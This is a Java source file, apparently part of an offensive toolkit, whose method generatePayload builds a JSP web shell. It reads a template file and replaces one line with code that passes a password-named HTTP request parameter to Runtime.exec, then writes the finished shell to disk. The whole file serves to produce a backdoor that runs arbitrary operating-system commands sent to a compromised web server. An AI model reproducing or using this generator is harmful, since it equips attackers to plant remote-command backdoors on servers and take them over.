package com.atlant1c.generate;

import java.io.*;

public class Jsp {
    public static void generatePayload(String pass, String outputFilePath) {
        // 要替换的内容
        String changedLine = "InputStream is = Runtime.getRuntime().exec(req.getParameter(\"" + pass + "\")).getInputStream();";
        // 指定要修改的行号
        int lineToChange = 17;

        String inputFilePath = "src/com/atlant1c/generate/JSPPayload.bin";
        try (
                BufferedReader reader = new BufferedReader(new FileReader(inputFilePath));
                BufferedWriter writer = new BufferedWriter(new FileWriter(outputFilePath))
        ) {
            String line;
            int currentLine = 0;

            // 逐行读取并写入到新文件
            while ((line = reader.readLine()) != null) {
                currentLine++;

                // 判断是否是要更改的行
                if (currentLine == lineToChange) {
                    // 替换成新的内容
                    line = changedLine;
                }

                // 写入到新文件
                writer.write(line);
                writer.newLine();  // 写入换行符
            }

            System.out.println("File modification successful.");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

}
